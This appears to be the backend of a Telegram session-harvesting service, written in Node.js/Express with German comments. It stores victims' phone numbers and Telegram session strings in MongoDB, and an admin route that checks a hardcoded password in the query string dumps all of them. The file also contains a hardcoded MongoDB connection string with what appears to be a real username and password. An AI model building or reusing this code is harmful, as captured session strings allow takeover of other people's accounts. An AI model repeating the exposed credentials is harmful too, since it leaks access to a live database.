const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// 1. Datenbank Verbindung
const mongoURI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority";

mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("MongoDB verbunden"))
    .catch(err => console.error("Verbindungsfehler:", err));

// 2. Schema und Modell definieren
const sessionSchema = new mongoose.Schema({
    phoneNumber: String,
    sessionString: String,
    timestamp: { type: Date, default: Date.now }
});

const SessionModel = mongoose.model('Session', sessionSchema);

// 3. Admin Route
app.get('/get-sessions', async (req, res) => {
    const providedPass = req.query.pass;
    const correctPass = 'Hinva312-'; 

    if (providedPass !== correctPass) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    try {
        const sessions = await SessionModel.find({}); 
        res.json(sessions);
    } catch (err) {
        console.error("Datenbank Fehler:", err);
        res.status(500).json({ error: 'Datenbankfehler beim Laden' });
    }
});

// ... hier kommen deine Login/Verify Endpunkte ...

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
